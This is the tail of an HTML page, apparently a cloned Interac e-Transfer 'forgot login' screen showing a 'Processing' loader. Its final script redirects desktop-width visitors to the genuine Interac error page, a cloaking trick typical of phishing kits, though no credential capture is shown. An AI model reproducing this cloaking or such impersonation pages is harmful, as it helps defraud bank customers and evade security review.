                    background-color: #ffffff;
                }
                </style>
                <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                    <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                        <style>
                        .loader-div {
                            text-align: center;
                            padding-top: 20px;
                        }

                        .loader-div h2 {
                            font-size: 28px;
                            margin-bottom: 40px;
                        }
                        </style>
                        <div class="_1AR6e5iqu8uXHMTFKLnqWr loader-div">
                            <h2 class="heading--title2 ng-binding">Processing</h2>
                            <img src="./files/loading.gif" width="80">
                        </div>
                    </div>
                </div>
            </form>
        </forgot-login>
    </div>



</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>
